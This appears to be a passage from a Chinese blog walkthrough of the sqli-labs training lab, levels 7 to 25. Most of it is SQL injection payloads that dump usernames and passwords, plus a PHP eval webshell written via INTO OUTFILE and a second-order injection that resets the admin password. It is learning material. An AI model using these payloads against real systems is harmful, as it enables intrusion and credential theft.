<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;)) UNION SELECT user(),version(),(select group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot; ) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\columns.txt&quot; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;))  UNION SELECT user(),version(),(select group_concat(username,0x23,password) from users) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\datas.txt&quot; --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><p>和第一种的前3步到获得修改文件权限的位置都是一样的。<br>之后是采用<strong>一句话木马</strong>的形式。<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27;)) union select 1,&quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\2.txt&quot; --+</span><br></pre></td></tr></table></figure>


<h2 id="8-GET方式的布尔盲注"><a href="#8-GET方式的布尔盲注" class="headerlink" title="8(GET方式的布尔盲注)"></a>8(GET方式的布尔盲注)</h2><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 无任何显示，说明是错误的<br>输入?id&#x3D;1’’  显示：You are in………..<br>输入?id&#x3D;1’--+  显示：You are in………..<br>说明构造成功，且是单引号字符型</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
</li>
</ol>
<ul>
<li>由于无法显示报错信息，我们需要使用length()函数首先判断数据库名长度<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and length(database())&gt;7--+  返回正确</span><br><span class="line">?id=1&#x27;and length(database())&gt;8--+  返回错误</span><br></pre></td></tr></table></figure>
说明数据库名长度为8</li>
<li>接下来便是一个个判断字符，这里可以使用substr(),mid(),substring(),ord(),ascii()等，选择比较多，任意选取即可<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;114--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;115--+   返回错误</span><br></pre></td></tr></table></figure>
说明数据库名第1个字符是s，以此类推，可得数据库名为security<br>数据库版本号也是同理</li>
</ul>
<ol start="3">
<li><p><strong>爆表</strong><br>道理是类似的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;102--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;101--+   返回错误</span><br></pre></td></tr></table></figure>
<p>说明第一个表名的第1个字符是e，以此类推，可以得到所有表名，最终我们发现关键的表名users<br>这里使用limit的原因是因为一个数据库名中表名很可能不止一个，我们需要依次查询</p>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;106--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;105--+   返回错误</span><br></pre></td></tr></table></figure>
<p>说明第一个字段名是i，以此类推，可以得到所有字段名，最终我们发现关键的字段名username,password</p>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;67--+  返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;68--+  返回错误</span><br></pre></td></tr></table></figure>
<p>说明第一个用户名是D，以此类推，可以得到所有用户名和密码。</p>
</li>
</ol>
<h2 id="9-10-GET方式的时间盲注"><a href="#9-10-GET方式的时间盲注" class="headerlink" title="9-10(GET方式的时间盲注)"></a>9-10(GET方式的时间盲注)</h2><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 显示：You are in………..<br>输入?id&#x3D;1” 显示：You are in………..<br>此时我们应该发现端倪，页面可能不会返回任何信息<br>输入?id&#x3D;1 and sleep(5)--+  页面迅速显示<br>输入?id&#x3D;1’and sleep(5)--+  页面延迟了5s，说明的确是应当使用时间盲注<br>输入?id&#x3D;1’’and sleep(5)--+  页面迅速显示<br>说明是单引号字符型注入</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select database()))&gt;7,sleep(5),1)--+    页面迅速显示</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;8,sleep(5),1)--+    页面延迟了5s</span><br></pre></td></tr></table></figure>
<p>说明数据库名长度是8个字符<br>版本号以此类推</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;115,sleep(5),1)--+   页面迅速显示</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;114,sleep(5),1)--+   页面延迟了5s</span><br></pre></td></tr></table></figure>
<p>最终尝试完后可得数据库名是security</p>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">如此判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">再逐一判断表名</span><br></pre></td></tr></table></figure>
<p>最终尝试完后可得所需表名为users</p>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名</span><br></pre></td></tr></table></figure>
<p>最终出现了我们所需的字段名username, password</p>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容</span><br></pre></td></tr></table></figure>
<p>最终得到了所需的数据</p>
</li>
</ol>
<ul>
<li>第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号</li>
</ul>
<h2 id="11-12-POST方式的字符型的联合注入"><a href="#11-12-POST方式的字符型的联合注入" class="headerlink" title="11-12(POST方式的字符型的联合注入)"></a>11-12(POST方式的字符型的联合注入)</h2><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>猜解方式和之前差不多。这里稍微使用点和之前不一样的方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1 #   万能密码构造成功，返回账户和密码</span><br></pre></td></tr></table></figure>
<p>说明：这里的注释要使用#，之前的--+不再适用</p>
</li>
<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2 #   返回正确信息</span><br><span class="line">1&#x27; order by 3 #   返回错误信息</span><br></pre></td></tr></table></figure>
<p>说明字段数为2</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select database(),version() #   返回Your Login name:security  Your Password:5.7.26</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br><span class="line">返回emails,referers,uagents,users</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; #</span><br><span class="line">返回id,username,password</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password) from users #  返回用户名和密码</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>第12关和第11关差不多，只是要用1”) or 1&#x3D;1 #</li>
</ul>
<h2 id="13-16-POST方式的时间盲注"><a href="#13-16-POST方式的时间盲注" class="headerlink" title="13-16(POST方式的时间盲注)"></a>13-16(POST方式的时间盲注)</h2><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) #  登录成功，但没有回显</span><br></pre></td></tr></table></figure>
<p>构造成功，然后使用时间盲注</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(length(database())&gt;7,sleep(10),1) #         判断数据库名长度</span><br><span class="line">admin&#x27;) and if(ascii(substring(database(),1,1))=115,sleep(10),1) #   判断数据库名第一个字符</span><br></pre></td></tr></table></figure>
<p>以此类推</p>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1); #     判断表名</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=101,sleep(10),1); #     判断字段名</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1); #</span><br><span class="line">判断数据</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>第14关差不多，只是构造方式变成了双引号</p>
</li>
<li><p>第15关和第11关差不多</p>
</li>
<li><p>第16关和第12关差不多</p>
</li>
</ul>
<h2 id="17-POST方式的报错注入"><a href="#17-POST方式的报错注入" class="headerlink" title="17(POST方式的报错注入)"></a>17(POST方式的报错注入)</h2><ol>
<li>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>如果不知道源码，去一遍遍尝试，会发现无论是布尔盲注还是时间盲注都无法得到预期结果，因此我们可以采用报错注入。<br>首先，那我们可以从源码中发现，有一个过滤函数check_input，其过滤步骤是：</li>
</ol>
<ul>
<li><code>substr($value,0,15)</code>截断到15位</li>
<li>单引号，双引号，反斜杠，null自动使用反斜杠转义</li>
<li>stripslashes()去掉多余的反斜杠<br>然后，passwd没有使用过滤函数过滤，因而可以进行注入。由此可使用报错注入。</li>
</ul>
<ol start="2">
<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>第一个用户名填写：admin<br>第二个密码填写所需的报错注入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本</span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name =&#x27;users&#x27;),0x5c),1))#    爆字段名</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users limit 0,1)test),0x7e),1) #  爆用户</span><br><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users where username=&#x27;admin&#x27; limit 0,1)test),0x7e),1) #      爆密码</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="18-User-Agent方式的报错注入"><a href="#18-User-Agent方式的报错注入" class="headerlink" title="18(User-Agent方式的报错注入)"></a>18(User-Agent方式的报错注入)</h2><ol>
<li><p>测试并判断注入类型<br>首先username和password输入admin<br>发现返回如下情况：<br><img src="/simg/sqli-labs_18.png" alt="返回情况"><br>返回了ip和user-agent的识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等<br>我们通过源码的check_input可以得知，username和passwd都被过滤了。所以我们不能使用在POST处注入手段。<br>继续检查源码，可以发现这条语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>
<p>因此我们可以从user-agent处注入。</p>
</li>
<li><p>通过burp抓包注入<br>burp的下载安装配置这里暂且不提，默认已弄好。<br>注意，如果是第一次抓包，会无法抓到，因为浏览器默认是不会抓127.0.0.1的包，需要自己设置。<br>打开Firefox，搜索about:config。<br>然后在访问后的搜索框内搜索 network.proxy.allow_hijacking_localhost，将值改为true</p>
</li>
</ol>
<p>另外还有一种方法，是将127改为自己的内网网址192.168.x.x<br>但这个方法我没成功，所以暂时搁置。</p>
<p>输入正确的用户名和密码后，在burp抓包，把user-agent的值改为我们需要注入的内容。如下图所示：<br><img src="/simg/sqli-labs_18_3.png" alt=" "></p>
<ol start="3">
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line">&#x27;or updatexml(1,concat(0x7e,(select version()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="19-Referer方式的报错注入"><a href="#19-Referer方式的报错注入" class="headerlink" title="19(Referer方式的报错注入)"></a>19(Referer方式的报错注入)</h2><ol>
<li><p>测试并判断注入类型<br>首先username和password输入admin<br>发现返回如下情况：<br><img src="/simg/sqli-labs_19.png" alt="返回情况"><br>返回了Referer<br>Referer是HTTP头的一个字段，用于告诉服务器该网页是从哪个页面链接过来的<br>这一次，我们在Referer的字段注入。</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line">&#x27;or updatexml(1,concat(0x7e,(select version()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="20-Cookie方式的联合注入"><a href="#20-Cookie方式的联合注入" class="headerlink" title="20(Cookie方式的联合注入)"></a>20(Cookie方式的联合注入)</h2><ol>
<li><p>测试并判断注入类型<br>正常输入了admin之后，我们发现出现了如下界面：<br><img src="/simg/sqli-labs_20.png" alt="返回情况"><br>点击下方的按钮，返回到原来界面<br>接下来我们再次输入admin，并显示到该界面，可以明显看出，cookie字段显示出来。<br>然后我们按F12，点击存储，再点击Cookie下的链接，修改值为admin’<br>刷新后，出现报错，说明存在注入。<br>因此我们可以利用修改cookie的方式进行注入</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27;order by 4 #</span></span><br></pre></td></tr></table></figure>
<p>报错，说明字段数为3</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,database(),version() #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users #</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="21-22-base64加密Cookie方式的联合注入"><a href="#21-22-base64加密Cookie方式的联合注入" class="headerlink" title="21-22(base64加密Cookie方式的联合注入)"></a>21-22(base64加密Cookie方式的联合注入)</h2><ol>
<li><p>测试并判断注入类型<br>通过输入admin，可以得到如下界面：<br><img src="/simg/sqli-labs_21.png" alt="返回情况"><br>通过观察，发现cookie变成了：uname &#x3D; YWRtaW4<br>有经验后可以判断出是经过了base64加密，于是我们用解密工具，可以解出值为：admin<br>接下来判断注入类型，开启burp抓包，把base64加密后的’修改到cookie，如下所示：<br><img src="/simg/sqli-labs_21_2.png" alt=" "><br>得到报错信息，可知注入方式为 ‘)</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) union select 1,database(),version() #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCkgIw==</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknICM=</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnICM=</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodXNlcm5hbWUsJzonLHBhc3N3b3JkKSBmcm9tIHVzZXJzICM=</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>第22关<br>和第21关差不多，只不过注入方式是 “<br>修改一下就可以用了</li>
</ul>
<h2 id="23-GET方式的恒为真联合注入"><a href="#23-GET方式的恒为真联合注入" class="headerlink" title="23(GET方式的恒为真联合注入)"></a>23(GET方式的恒为真联合注入)</h2><ol>
<li>测试并判断注入类型<br>输入<code>?id=1</code> 返回用户名和密码<br>输入<code>?id=1&#39;</code> 返回报错<br>输入<code>?id=1&#39;order by 3 --+</code> 返回报错<br>输入<code>?id=1&#39;order by 3 #</code> 返回报错<br>可以查看源码，发现了一个preg_replace()函数<br>这里作用是相当于将$id中的$reg类型的字符转变位$replace字符，也就是将$id中的#和--置空过滤<br>说明注释被过滤了，那么接下来将提供两种思路</li>
</ol>
<ul>
<li>第1种<br>采用URL终止符<code>%00</code></li>
</ul>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;order by 4; %00</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3; %00</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),version(); %00</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;; %00</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;; %00</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users; %00</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>第2种<br>单引号闭合<code>?id=1&#39; or &#39;1&#39;=&#39;1</code></li>
</ul>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,2,3,4 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,2,3,4 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,database(),3 or &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27; union select 6,version(),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(username,&#x27;:&#x27;,password) from users),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="24-POST方式的二次注入"><a href="#24-POST方式的二次注入" class="headerlink" title="24(POST方式的二次注入)"></a>24(POST方式的二次注入)</h2><ol>
<li><p>测试并判断注入类型<br>进入页面，我们可以看到有3个页面：log in, forgot password, new user<br>在log in 页面输入错误的账户名密码时，会返回错误页面。而当输入正确时，返回正确页面，并且可以更改密码。<br>查看源码时，可以发现，登录和注册页面都使用了mysql_real_escape_string()函数。<br>mysql_real_escape_string()函数的作用简单来说，是转义SQL语句中使用的字符串中的特殊字符。详细可看：<a href="https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp">PHP mysql_real_escape_string() 函数</a><br>因此，我们无法通过用户名和密码进行注入。但是，我们在查看pass_change.php时，可以发现这一行语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$username<span class="operator">=</span> $_SESSION[&quot;username&quot;];</span><br></pre></td></tr></table></figure>
<p>也即修改密码时，用户名不会转义。<br>通常情况下，我们并不知晓admin的账户密码，因此只能猜测用户名是admin，去创造一个新用户为<code>admin&#39;#</code>的账号来绕过admin，修改admin的密码。这里涉及到了二次注入的概念。<br>二次注入：攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br>二次注入，可以概括为以下两步:<br>第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br>第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
</li>
<li><p>注册新用户绕过admin修改admin的密码<br>首先注册一个账号，名为<code>admin&#39;#</code><br>密码123456<br>然后登录该账号<br>再修改密码为111111<br>可以看到页面显示修改成功<br>我们再次登录，账号：admin  密码：111111<br>发现管理员账户登录就成功了。</p>
</li>
</ol>
<h2 id="25-25a-双写绕过的联合注入"><a href="#25-25a-双写绕过的联合注入" class="headerlink" title="25-25a(双写绕过的联合注入)"></a>25-25a(双写绕过的联合注入)</h2><ol>
<li>测试并判断注入类型<br>首先本关页面出现了明显提示，or和and似乎都不能使用了。但我们检查源码时，我们可以发现这一段函数<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
从这个函数可以发现，or和and被替换成空了，但这个替换只会检查一次所有字符，将字符里的所有含or或and的字符替换成空字符。<br>下面尝试注入</li>
</ol>
